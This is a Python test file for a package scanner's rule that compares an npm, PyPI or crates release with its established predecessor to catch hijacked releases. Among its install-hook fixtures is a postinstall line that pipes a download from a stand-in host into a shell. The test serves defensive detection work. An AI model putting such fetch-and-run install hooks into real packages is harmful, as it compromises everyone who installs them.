"""SC-NEW-INDICATOR (registry/prior.py): a release that would be WARN is compared with its established predecessor,
the newest release published at least a week before it, scanned as the release was; a weaker indicator's rule the
predecessor had no finding of is CRITICAL. The shape of a hijacked release of an established package (Shai-Hulud's
postinstall, 2025).

The registries are fakes served by URL (`repo._fetch` for the documents, `repo.http_bytes` for the files; a crate's
module is a fake too); nothing reaches the network. Names are made up and the payloads inert: an install hook that
runs a file that prints (and a program it names, never run), a base64 string of the bytes 0 to 255."""
import base64
import datetime
import hashlib
import io
import json
import os
import time
import unittest
import urllib.parse
import zipfile
from unittest import mock

from lazaret.registry import prior, repo
from tests.registry._review_support import manifest, tarball

UTC = datetime.timezone.utc
RELEASE = datetime.datetime(2026, 9, 1, 12, 0, tzinfo=UTC)
DAY = datetime.timedelta(days=1)
BLOB = base64.b64encode(bytes(range(256)) * 2).decode()
ON = {prior.OFF_ENV: "", "LAZARET_NO_DEPENDENCY_HISTORY": ""}


def iso(dt):
    return dt.isoformat().replace("+00:00", "Z")


def npm_package(hook, clean=False, **files):
    """An npm tarball: with `hook`, a postinstall that runs install.js and a program of its own, `npx` (SC-INSTALL-HOOK,
    MAJOR, with an indicator of its own); `clean`: install.js alone, which the install-script test reads clean
    (NEW-HOOK-FP); `files`: more files, or others in their place."""
    cmd = "node install.js" if clean else "node install.js && npx --yes files-kit-setup"
    files = {"package.json": manifest(main="index.js", **({"scripts": {"postinstall": cmd}} if hook else {})),
             "index.js": "module.exports = 1;\n", "install.js": "console.log('ready');\n", **files}
    return tarball(files)


def sri(data):
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


class Registry:
    """The registry's documents and files by URL; a URL it does not know is a 404."""

    def __init__(self):
        self.docs, self.files, self.fetched = {}, {}, []

    def fetch(self, url, max_bytes=None, timeout=None, accept=None, **_kw):
        self.fetched.append(url)
        doc = self.docs.get(url)
        if isinstance(doc, Exception):
            raise doc
        if doc is None:
            raise repo.FetchError(f"HTTP 404 fetching {url}")
        return json.dumps(doc).encode()

    def bytes(self, url):
        self.fetched.append(url)
        if url not in self.files:
            raise repo.FetchError(f"HTTP 404 fetching {url}")
        return self.files[url]


NPM = "https://registry.npmjs.org/"


def npm_registry(name, versions):
    """{version: (published, tarball bytes)} -> a Registry with the package's packument and tarballs."""
    reg, times, docs = Registry(), {"created": iso(min(t for t, _d in versions.values()))}, {}
    for v, (when, data) in versions.items():
        url = f"{NPM}{name}/-/{name}-{v}.tgz"
        reg.files[url] = data
        times[v] = iso(when)
        docs[v] = {"name": name, "version": v, "dist": {"tarball": url, "integrity": sri(data)}}
    reg.docs[NPM + urllib.parse.quote(name, safe="@")] = {"name": name, "time": times, "versions": docs}
    return reg


def scan_npm(reg, name, version, env=None):
    entry = json.loads(reg.fetch(NPM + urllib.parse.quote(name, safe="@")))["versions"][version]
    reg.fetched.clear()
    rv = (version, entry["dist"]["tarball"], "tgz", "npm", entry)
    with mock.patch.object(repo, "resolve_npm", return_value=rv), mock.patch.object(repo, "_fetch", reg.fetch), \
            mock.patch.object(repo, "http_bytes", reg.bytes), mock.patch.dict(os.environ, env or ON):
        return repo.scan_package("npm", name, version)


def new_indicators(res):
    return [i for i in res["issues"] if i["rule"] == prior.RULE]


class NpmTests(unittest.TestCase):
    def test_a_hook_its_established_predecessor_did_not_have(self):
        # 1.0.1, two days before, has the hook too: an attacker's own earlier release is not the one compared with
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(False)),
                                         "1.0.1": (RELEASE - 2 * DAY, npm_package(True)),
                                         "1.0.2": (RELEASE, npm_package(True))})
        res = scan_npm(reg, "files-kit", "1.0.2")
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertEqual(res["priorRelease"], {"version": "1.0.0", "publishedBefore": "30 days",
                                               "files": ["files-kit-1.0.0.tgz"], "newRules": ["SC-INSTALL-HOOK"]})
        [found] = new_indicators(res)
        self.assertEqual((found["sev"], found["file"]), ("CRITICAL", "package.json"))
        self.assertIn("(SC-INSTALL-HOOK) is new in this release: 1.0.0, published 30 days before it", found["msg"])
        self.assertIn("Shai-Hulud", found["why"])
        # the same release without the comparison is WARN
        off = scan_npm(reg, "files-kit", "1.0.2", env={prior.OFF_ENV: "1"})
        self.assertEqual((off["verdict"], new_indicators(off), "priorRelease" in off), ("WARN", [], False))
        self.assertEqual(reg.fetched, [f"{NPM}files-kit/-/files-kit-1.0.2.tgz"])        # the release's file alone

    def test_a_hook_its_predecessor_had(self):
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(True)),
                                         "1.0.2": (RELEASE, npm_package(True))})
        res = scan_npm(reg, "files-kit", "1.0.2")
        self.assertEqual((res["verdict"], new_indicators(res)), ("WARN", []))
        self.assertEqual(res["priorRelease"]["newRules"], [])
        # the packument read once for the release: the comparison's, and SC-VERSION-INFLATION's from the same History
        self.assertEqual(reg.fetched, [f"{NPM}files-kit/-/files-kit-1.0.2.tgz", NPM + "files-kit",
                                       f"{NPM}files-kit/-/files-kit-1.0.0.tgz"])

    def test_the_packument_is_read_once_for_the_release(self):
        # a release with a dependency, compared: SC-NEW-DEPENDENCY, SC-NEW-INDICATOR and SC-VERSION-INFLATION all read
        # the packument, and it is fetched once (the dependency's own document is SC-NEW-DEPENDENCY's alone)
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(True)),
                                         "1.0.2": (RELEASE, npm_package(True))})
        reg.docs[NPM + "files-kit"]["versions"]["1.0.2"]["dependencies"] = {"left-kit": "^1.0.0"}
        reg.docs[NPM + "left-kit"] = {"name": "left-kit", "time": {"created": iso(RELEASE - 900 * DAY)},
                                      "maintainers": [{"name": "someone"}]}
        res = scan_npm(reg, "files-kit", "1.0.2")
        self.assertEqual((res["verdict"], res["priorRelease"]["newRules"]), ("WARN", []))
        self.assertEqual(sorted(reg.fetched), sorted([f"{NPM}files-kit/-/files-kit-1.0.2.tgz", NPM + "files-kit",
                                                      f"{NPM}files-kit/-/files-kit-1.0.0.tgz", NPM + "left-kit"]))

    def test_a_new_hook_read_clean_is_not_a_new_indicator(self):
        # NEW-HOOK-FP (John, Oct 15): a new install hook whose files the install-script test reads clean stays MAJOR;
        # pnpm 12.8.1's shape, `node install.js` as its preinstall and its postinstall (index.js's blob: compared)
        blob = {"index.js": f"module.exports = '{BLOB}';\n"}
        new = tarball({"package.json": manifest(main="index.js", scripts={"preinstall": "node install.js",
                                                                         "postinstall": "node install.js"}),
                       "install.js": "const os = require('os');\nconsole.log('ready', os.platform());\n", **blob})
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(False, **blob)),
                                         "1.0.2": (RELEASE, new)})
        res = scan_npm(reg, "files-kit", "1.0.2")
        self.assertEqual((res["verdict"], new_indicators(res)), ("WARN", []), res["verdictReason"])
        self.assertEqual(res["priorRelease"]["newRules"], [])                           # (SC-B64 asked, and had)
        hooks = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
        self.assertEqual([(i["sev"], i.get("readClean")) for i in hooks], [("MAJOR", True)] * 2)
        # read clean and nothing else asked: nothing to compare, nothing of the predecessor fetched. The packument is
        # fetched once all the same: SC-VERSION-INFLATION (RA-7) reads the version history of every release that is not
        # SUSPICIOUS (John, Oct 17: "Unconditional RA-7"), which is why this is two requests and no longer one
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(False)),
                                         "1.0.2": (RELEASE, npm_package(True, clean=True))})
        res = scan_npm(reg, "files-kit", "1.0.2")
        self.assertEqual((res["verdict"], "priorRelease" in res), ("WARN", False))
        self.assertEqual(reg.fetched, [f"{NPM}files-kit/-/files-kit-1.0.2.tgz", NPM + "files-kit"])

    def test_a_new_hook_with_an_indicator_of_its_own(self):
        # each a new hook the install-script test does not read clean: compared, new, CRITICAL (the release's other
        # weaker finding, index.js's blob, its predecessor had)
        blob = f"module.exports = '{BLOB}';\n"
        lib = {"install.js": "require('./lib/setup')();\n", "lib/setup.js": f"module.exports = () => '{BLOB}';\n"}
        cases = {"a program of its own": ("node install.js && npx --yes files-kit-setup", {}),
                 "code inline": ('node -e "console.log(1)"', {}),
                 "a file the package does not hold": ("node missing.js", {}),
                 "a download or evaluation tool on its face": ("sh scripts/base64-setup.sh",
                                                              {"scripts/base64-setup.sh": "echo ready\n"}),
                 "a module it loads with a weaker finding": ("node install.js", lib)}
        for why, (cmd, files) in cases.items():
            with self.subTest(why):
                new = tarball({"package.json": manifest(main="index.js", scripts={"postinstall": cmd}),
                               "index.js": blob, "install.js": "console.log('ready');\n", **files})
                old = npm_package(False, **{"index.js": blob})
                reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, old), "1.0.2": (RELEASE, new)})
                res = scan_npm(reg, "files-kit", "1.0.2")
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
                self.assertEqual(res["priorRelease"]["newRules"], ["SC-INSTALL-HOOK"])
                [hook] = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
                self.assertEqual((hook["sev"], "readClean" in hook), ("MAJOR", False))

    def test_no_established_predecessor(self):
        for versions in ({"1.0.2": (RELEASE, npm_package(True))},
                         {"1.0.1": (RELEASE - 6 * DAY, npm_package(False)), "1.0.2": (RELEASE, npm_package(True))}):
            with self.subTest(versions=sorted(versions)):
                res = scan_npm(npm_registry("files-kit", versions), "files-kit", "1.0.2")
                self.assertEqual(res["verdict"], "WARN")
                self.assertEqual(res["priorRelease"], {"notCompared": "no release published a week or more before "
                                                                      "this one"})

    def test_a_prerelease_is_not_a_releases_predecessor(self):
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 40 * DAY, npm_package(True)),
                                         "1.1.0-beta.1": (RELEASE - 10 * DAY, npm_package(False)),
                                         "1.1.0": (RELEASE, npm_package(True))})
        res = scan_npm(reg, "files-kit", "1.1.0")
        self.assertEqual((res["verdict"], res["priorRelease"]["version"]), ("WARN", "1.0.0"))

    def test_what_the_registry_does_not_give_is_no_finding(self):
        good = {"1.0.0": (RELEASE - 30 * DAY, npm_package(False)), "1.0.2": (RELEASE, npm_package(True))}
        cases = []
        reg = npm_registry("files-kit", good)                    # the predecessor's file is not what was published
        reg.files[f"{NPM}files-kit/-/files-kit-1.0.0.tgz"] = npm_package(True)
        cases.append((reg, "DigestError"))
        reg = npm_registry("files-kit", good)                    # its file is gone
        del reg.files[f"{NPM}files-kit/-/files-kit-1.0.0.tgz"]
        cases.append((reg, "FetchError"))
        for reg, why in cases:
            with self.subTest(why=why):
                res = scan_npm(reg, "files-kit", "1.0.2")
                self.assertEqual((res["verdict"], new_indicators(res)), ("WARN", []))
                self.assertTrue(res["priorRelease"]["notCompared"].startswith(why), res["priorRelease"])
        reg = npm_registry("files-kit", good)                    # the packument over the budget, or not answering
        entry = reg.docs[NPM + "files-kit"]["versions"]["1.0.2"]
        reg.docs[NPM + "files-kit"] = repo.FetchError("response exceeds 16MB budget")
        rv = ("1.0.2", entry["dist"]["tarball"], "tgz", "npm", entry)
        with mock.patch.object(repo, "resolve_npm", return_value=rv), mock.patch.object(repo, "_fetch", reg.fetch), \
                mock.patch.object(repo, "http_bytes", reg.bytes), mock.patch.dict(os.environ, ON):
            res = repo.scan_package("npm", "files-kit", "1.0.2")
        self.assertEqual(res["verdict"], "WARN")
        self.assertIn("16MB budget", res["priorRelease"]["notCompared"])

    def test_off(self):
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(False)),
                                         "1.0.2": (RELEASE, npm_package(True))})
        for env in ({prior.OFF_ENV: "1"}, {"LAZARET_NO_DEPENDENCY_HISTORY": "1"}):
            with self.subTest(env=env):
                res = scan_npm(reg, "files-kit", "1.0.2", env=env)
                self.assertEqual((res["verdict"], "priorRelease" in res), ("WARN", False))
                self.assertEqual(len(reg.fetched), 1)

    def test_a_strong_release_asks_nothing(self):
        # (nor does SC-VERSION-INFLATION read the history of a release already SUSPICIOUS: its MAJOR adds nothing)
        evil = tarball({"package.json": manifest(scripts={"postinstall": "curl https://e.invalid/x | sh"})})
        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(False)), "1.0.2": (RELEASE, evil)})
        res = scan_npm(reg, "files-kit", "1.0.2")
        self.assertEqual((res["verdict"], "priorRelease" in res, len(reg.fetched)), ("SUSPICIOUS", False, 1))


def wheel(version, blob):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("pkg/__init__.py", f"DATA = '{BLOB}'\n" if blob else "DATA = 1\n")
        z.writestr(f"pkg-{version}.dist-info/METADATA", f"Metadata-Version: 2.1\nName: pkg\nVersion: {version}\n")
        z.writestr(f"pkg-{version}.dist-info/WHEEL", "Wheel-Version: 1.0\n")
        z.writestr(f"pkg-{version}.dist-info/RECORD", "")
    return buf.getvalue()


class PypiTests(unittest.TestCase):
    def registry(self, old_blob):
        """pkg 1.0 (two wheels, 30 days before) and 1.1, as the Simple API lists them."""
        reg, files = Registry(), []
        for version, when, tag, blob in (("1.0", RELEASE - 30 * DAY, "py3-none-any", old_blob),
                                         ("1.0", RELEASE - 30 * DAY, "cp312-cp312-win_amd64", True),
                                         ("1.1", RELEASE, "py3-none-any", True)):
            name = f"pkg-{version}-{tag}.whl"
            url = f"https://files.pythonhosted.org/packages/xx/{name}"
            data = wheel(version, blob)
            reg.files[url] = data
            files.append({"filename": name, "url": url, "hashes": {"sha256": hashlib.sha256(data).hexdigest()},
                          "upload-time": iso(when)})
        reg.docs["https://pypi.org/simple/pkg/"] = {"name": "pkg", "versions": ["1.0", "1.1"], "files": files}
        return reg

    def scan(self, reg):
        url = "https://files.pythonhosted.org/packages/xx/pkg-1.1-py3-none-any.whl"
        art = {"url": url, "container": "zip", "artifact": "wheel", "filename": url.rsplit("/", 1)[-1],
               "entry": {"digests": {"sha256": hashlib.sha256(reg.files[url]).hexdigest()}}}
        with mock.patch.object(repo, "resolve_pypi", return_value=repo.Resolution("1.1", [art])), \
                mock.patch.object(repo, "_fetch", reg.fetch), mock.patch.object(repo, "http_bytes", reg.bytes), \
                mock.patch.dict(os.environ, ON):
            return repo.scan_package("pypi", "pkg", "1.1")

    def test_a_blob_its_predecessor_did_not_have(self):
        res = self.scan(self.registry(old_blob=False))
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        # the predecessor's wheel of the same tags, not the first one listed (whose module has the blob)
        self.assertEqual(res["priorRelease"]["files"], ["pkg-1.0-py3-none-any.whl"])
        self.assertEqual([(i["sev"], i["file"]) for i in new_indicators(res)], [("CRITICAL", "pkg/__init__.py")])

    def test_one_it_had(self):
        reg = self.registry(old_blob=True)
        res = self.scan(reg)
        self.assertEqual((res["verdict"], res["priorRelease"]["newRules"]), ("WARN", []))
        # the Simple API document read once: the comparison's, and SC-VERSION-INFLATION's from the same History
        self.assertEqual(reg.fetched.count("https://pypi.org/simple/pkg/"), 1)


class FakeCrates:
    """The crates module as prior.py asks it: the index's lines, a release's file, its digest check."""

    def __init__(self, versions):
        self.versions = versions                     # {version: (published, .crate bytes, yanked)}

    def records(self, name, fetch):
        return [{"name": name, "vers": v, "pubtime": iso(t), "yanked": y} for v, (t, _d, y) in self.versions.items()]

    def resolve(self, name, version, fetch):
        art = {"url": f"https://static.crates.io/crates/{name}/{name}-{version}.crate", "container": "tgz",
               "artifact": "crate", "entry": {"vers": version}, "filename": f"{name}-{version}.crate"}
        return repo.Resolution(version, [art])

    def verify(self, data, entry, name, version):
        return None

    def bytes(self, url, max_bytes):
        version = url.rsplit("-", 1)[1][:-len(".crate")]
        return self.versions[version][1]


def crate(version, blob):
    files = {"Cargo.toml": f'[package]\nname = "kit"\nversion = "{version}"\n',
             "src/lib.rs": f'pub const DATA: &str = "{BLOB}";\n' if blob else "pub const DATA: u8 = 1;\n"}
    return tarball(files, root=f"kit-{version}/")


class CratesTests(unittest.TestCase):
    def test_a_crate_compared_by_the_index(self):
        for old_blob, yanked, want in ((False, False, ["SC-B64"]), (True, False, []), (True, True, None)):
            with self.subTest(old_blob=old_blob, yanked=yanked):
                fake = FakeCrates({"0.9.0": (RELEASE - 20 * DAY, crate("0.9.0", old_blob), yanked),
                                   "1.0.0": (RELEASE, crate("1.0.0", True), False)})
                r = repo._scan_artifact(crate("1.0.0", True), "tgz", "crate", False,
                                        repo.Budget(deadline=time.monotonic() + 30, deadline_detail="b"))
                with mock.patch.object(repo, "registry_module", return_value=fake), \
                        mock.patch.object(repo, "module_fetch", return_value=fake), mock.patch.dict(os.environ, ON):
                    issues, summary = prior.release_issues("crates", "kit", "1.0.0", fake.resolve("kit", "1.0.0", None),
                                                           r["issues"], [{"filename": "kit-1.0.0.crate",
                                                                          "kind": "crate"}])
                self.assertEqual(summary.get("newRules"), want, summary)          # (a yanked one is not compared)
                self.assertEqual([i["rule"] for i in issues], [prior.RULE] * len(want or ()))


class PartsTests(unittest.TestCase):
    def test_what_is_asked(self):
        issue = lambda rule, sev: {"rule": rule, "sev": sev, "file": "f"}               # noqa: E731
        self.assertEqual(sorted(prior.candidates([issue("SC-B64", "MAJOR"), issue("SC-BINARY", "MAJOR"),
                                                  issue("SC-OPAQUE-BLOB", "MINOR"), issue("SC-NESTED-ARCHIVE", "MINOR"),
                                                  issue("SC-TRUNCATED", "MAJOR"), issue("SC-UNUSED-DEPENDENCY", "INFO"),
                                                  issue("S-EVAL-JS", "MAJOR"), issue("SC-INSTALL-HOOK", "MINOR"),
                                                  issue("SC-NESTED-CODE", "MAJOR")])),     # (generated code: JS-NEST)
                         ["SC-B64", "SC-INSTALL-HOOK"])
        # an install hook read clean is not asked about (NEW-HOOK-FP); one that is not, beside it, is
        clean = dict(issue("SC-INSTALL-HOOK", "MAJOR"), readClean=True)
        self.assertEqual(prior.candidates([clean]), {})
        other = issue("SC-INSTALL-HOOK", "MAJOR")
        self.assertIs(prior.candidates([clean, other])["SC-INSTALL-HOOK"], other)
        self.assertEqual(prior.candidates([dict(issue("SC-B64", "MAJOR"), readClean=True)]).keys(), {"SC-B64"})
        self.assertEqual(prior.candidates([issue("SC-B64", "MAJOR"), issue("SC-PIPE-SHELL", "CRITICAL")]), {})

    def test_the_established_predecessor(self):
        times = {"1.0.0": iso(RELEASE - 7 * DAY), "1.0.1": iso(RELEASE - 7 * DAY + datetime.timedelta(seconds=1)),
                 "2.0.0-rc.1": iso(RELEASE - 8 * DAY), "1.0.2": iso(RELEASE)}
        pre = lambda v: "-" in v                                                        # noqa: E731
        when, best = prior.established(times, "1.0.2", times, pre)
        self.assertEqual((when, best[0]), (RELEASE, "1.0.0"))                           # a week to the second
        self.assertEqual(prior.established(times, "3.0.0-rc.1", times, pre), (None, None))
        self.assertEqual(prior.established(times, "1.0.2", times, pre, gap=0 * DAY)[1][0], "1.0.1")

    def test_the_files_compared(self):
        refs = [{"filename": f"p-1.0-{t}.whl", "artifact": "wheel"} for t in ("cp312-win", "py3-none-any")] + [
            {"filename": "p-1.0.tar.gz", "artifact": "sdist"}]
        per = [{"filename": "p-1.1-py3-none-any.whl", "kind": "wheel"}, {"filename": "p-1.1.tar.gz", "kind": "sdist"},
               {"filename": "p-1.1-cp313-mac.whl", "kind": "wheel"}]
        self.assertEqual([r["filename"] for r in prior.counterparts(per, {"p-1.1-py3-none-any.whl",
                                                                          "p-1.1-cp313-mac.whl"}, "1.1", "1.0", refs)],
                         ["p-1.0-py3-none-any.whl", "p-1.0-cp312-win.whl"])            # the same name, else the kind
        tags = ("a", "b", "c", "d")
        many = prior.counterparts([{"filename": f"p-1.1-{t}.whl", "kind": "wheel"} for t in tags],
                                  {f"p-1.1-{t}.whl" for t in tags}, "1.1", "1.0",
                                  [{"filename": f"p-1.0-{t}.whl", "artifact": "wheel"} for t in tags])
        self.assertEqual([r["filename"] for r in many], ["p-1.0-a.whl", "p-1.0-b.whl", "p-1.0-c.whl"])  # MAX_FILES


if __name__ == "__main__":
    unittest.main()
